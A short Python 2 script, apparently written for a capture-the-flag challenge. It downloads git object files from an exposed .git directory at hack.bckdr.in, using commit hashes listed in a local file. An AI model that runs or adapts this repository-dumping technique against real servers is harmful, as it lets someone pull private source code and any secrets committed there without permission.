
import requests

commits = []

with open('commits.txt', 'r') as f:
  for line in f:
    commits.append(line.strip())


import os
for commit in commits:
  two_char = commit[0:2]
  print "[+] Two char %s" % two_char
  ref = commit[2:]
  print "[+] Ref %s" % ref
  url = "http://hack.bckdr.in/CLUE/.git/objects/" + two_char + "/" + ref
  print url
  obj_dir = "objects" + "/" + two_char
  obj_ref = "objects" + "/" + two_char + "/" + ref
  print "[+] Getting it"
  r = requests.get(url)
  print "[+] Got"
  if not os.path.exists(os.path.dirname(obj_ref)):
    try:
      print "[+] Got"        
      os.makedirs(os.path.dirname(obj_ref))
    except OSError as exc: # Guard against race condition
      if exc.errno != errno.EEXIST:
        raise
  with open(obj_ref, 'w+') as f:
    f.write(r.content)







